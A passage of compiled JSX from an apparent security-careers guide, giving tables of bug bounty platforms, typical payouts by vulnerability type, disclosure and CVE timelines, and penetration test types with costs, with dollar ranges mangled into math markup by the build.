              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "0.7278em",
                      verticalAlign: "-0.0833em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "50"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "−"
                  })]
                })
              })]
            }), "100K+"]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Public/Private"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Microsoft, Atlassian, Spotify"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Intigriti"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "2016"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mn, {
                        children: "50"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        children: "−"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "50 - "
                    })]
                  })
                })
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "0.7278em",
                      verticalAlign: "-0.0833em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "50"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "−"
                  })]
                })
              })]
            }), "50K+"]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Public/Private"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Apple (private), KPMG, Intel"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Synack"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "2013"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mn, {
                        children: "100"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        children: "−"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "100 - "
                    })]
                  })
                })
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "0.7278em",
                      verticalAlign: "-0.0833em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "100"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "−"
                  })]
                })
              })]
            }), "25K+"]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Invite-only"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "US Federal (DHS), PayPal"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "YesWeHack"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "2015"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mn, {
                        children: "50"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        children: "−"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "50 - "
                    })]
                  })
                })
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "0.7278em",
                      verticalAlign: "-0.0833em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "50"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "−"
                  })]
                })
              })]
            }), "50K+"]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Public/Private"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Orange, DoD France"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Top Bug Bounty Earners (public 2024):"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "PinkDraconian"
        }), " (HackerOne): $2M+ lifetime, Microsoft-focused"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "djadmin"
        }), " (Apple Security Hall of Fame): Multiple iOS bypasses"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "reentrancy"
        }), " (Google VRP): $1M+ lifetime"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "nyangawa"
        }), " (HackerOne): $500K+, XSS and SSRF specialist"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Bug Bounty Payout Examples:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Vulnerability"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Typical Bounty"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Platform"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "XSS (stored)"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mn, {
                        children: "500"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        children: "−"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "500 - "
                    })]
                  })
                })
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "0.7278em",
                      verticalAlign: "-0.0833em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "500"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "−"
                  })]
                })
              })]
            }), "5,000"]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "HackerOne"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "SQL Injection"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mn, {
                        children: "2"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        separator: "true",
                        children: ","
                      }), (0,jsx_runtime.jsx)(_components.mn, {
                        children: "000"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        children: "−"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "2,000 - "
                    })]
                  })
                })
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "0.8389em",
                      verticalAlign: "-0.1944em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "2"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mpunct",
                    children: ","
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mspace",
                    style: {
                      marginRight: "0.1667em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "000"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "−"
                  })]
                })
              })]
            }), "15,000"]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Bugcrowd"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "RCE (authenticated)"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mn, {
                        children: "5"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        separator: "true",
                        children: ","
                      }), (0,jsx_runtime.jsx)(_components.mn, {
                        children: "000"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        children: "−"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "5,000 - "
                    })]
                  })
                })
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "0.8389em",
                      verticalAlign: "-0.1944em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "5"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mpunct",
                    children: ","
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mspace",
                    style: {
                      marginRight: "0.1667em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "000"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "−"
                  })]
                })
              })]
            }), "25,000"]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "HackerOne"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "RCE (unauthenticated)"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mn, {
                        children: "10"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        separator: "true",
                        children: ","
                      }), (0,jsx_runtime.jsx)(_components.mn, {
                        children: "000"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        children: "−"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "10,000 - "
                    })]
                  })
                })
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "0.8389em",
                      verticalAlign: "-0.1944em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "10"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mpunct",
                    children: ","
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mspace",
                    style: {
                      marginRight: "0.1667em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "000"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "−"
                  })]
                })
              })]
            }), "50,000"]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Google VRP"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Account Takeover"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mn, {
                        children: "3"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        separator: "true",
                        children: ","
                      }), (0,jsx_runtime.jsx)(_components.mn, {
                        children: "000"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        children: "−"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "3,000 - "
                    })]
                  })
                })
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "0.8389em",
                      verticalAlign: "-0.1944em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "3"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mpunct",
                    children: ","
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mspace",
                    style: {
                      marginRight: "0.1667em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "000"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "−"
                  })]
                })
              })]
            }), "20,000"]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Microsoft"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "SSRF (cloud metadata)"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mn, {
                        children: "5"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        separator: "true",
                        children: ","
                      }), (0,jsx_runtime.jsx)(_components.mn, {
                        children: "000"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        children: "−"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "5,000 - "
                    })]
                  })
                })
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "0.8389em",
                      verticalAlign: "-0.1944em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "5"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mpunct",
                    children: ","
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mspace",
                    style: {
                      marginRight: "0.1667em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "000"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "−"
                  })]
                })
              })]
            }), "15,000"]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "HackerOne"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Zero-click RCE chain"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mn, {
                        children: "50"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        separator: "true",
                        children: ","
                      }), (0,jsx_runtime.jsx)(_components.mn, {
                        children: "000"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        children: "−"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "50,000 - "
                    })]
                  })
                })
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "0.8389em",
                      verticalAlign: "-0.1944em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "50"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mpunct",
                    children: ","
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mspace",
                    style: {
                      marginRight: "0.1667em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "000"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "−"
                  })]
                })
              })]
            }), "250,000"]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Apple"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "25-vulnerability-disclosure",
      children: "2.5 Vulnerability Disclosure"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Coordinated Disclosure Process:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Week 1: Researcher identifies vulnerability\nWeek 2-3: Researcher contacts vendor via security@ or bug bounty\nWeek 3-4: Acknowledged by vendor, CVE reserved\nWeek 4-8: Vendor develops patch (negotiates timeline)\nWeek 9: Patch released, CVE published, public disclosure\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "CVE Process:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Researcher or vendor requests CVE ID from CVE Numbering Authority (CNA)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "CNA assigns CVE ID (format: CVE-YEAR-NUMBER)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Details: affected product, vulnerability type, impact, CVSS score"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "CVE is published on NVD (National Vulnerability Database) after patch release"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "References include vendor advisories, researcher writeups, exploit code"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Responsible Disclosure Timeline:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Standard:"
        }), " 90-120 days from vendor notification to public disclosure"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Active Exploitation:"
        }), " Immediate notification, possibly faster disclosure"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "No Response:"
        }), " 90 days → public disclosure with limited detail"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Industry Standard:"
        }), " Google Project Zero: 90 days fixed, 14 day grace for active exploits"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "26-types-of-penetration-testing",
      children: "2.6 Types of Penetration Testing"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Pentest Type"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Focus"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Typical Duration"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Cost Range"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Network Pentest"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "External/internal network"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "1-3 weeks"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mn, {
                        children: "10"
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "K"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        children: "−"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "10K - "
                    })]
                  })
                })
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "0.7667em",
                      verticalAlign: "-0.0833em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "10"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    style: {
                      marginRight: "0.0715em"
                    },
                    children: "K"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "−"
                  })]
                })
              })]
            }), "50K"]
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Web Application"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "OWASP Top 10, business logic"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "1-4 weeks"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mn, {
                        children: "15"
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "K"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        children: "−"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "15K - "
                    })]
                  })
                })
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "0.7667em",
                      verticalAlign: "-0.0833em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "15"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    style: {
                      marginRight: "0.0715em"
                    },
                    children: "K"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "−"
                  })]
                })
              })]
            }), "80K"]
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Cloud Pentest"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "AWS/Azure/GCP configs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "1-3 weeks"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mn, {
                        children: "15"
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "K"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        children: "−"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "15K - "
                    })]
                  })
                })
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "0.7667em",
                      verticalAlign: "-0.0833em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "15"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    style: {
                      marginRight: "0.0715em"
                    },
                    children: "K"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "−"
                  })]
                })
              })]
            }), "60K"]
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Mobile App"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "iOS, Android (MASTG)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "1-3 weeks"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
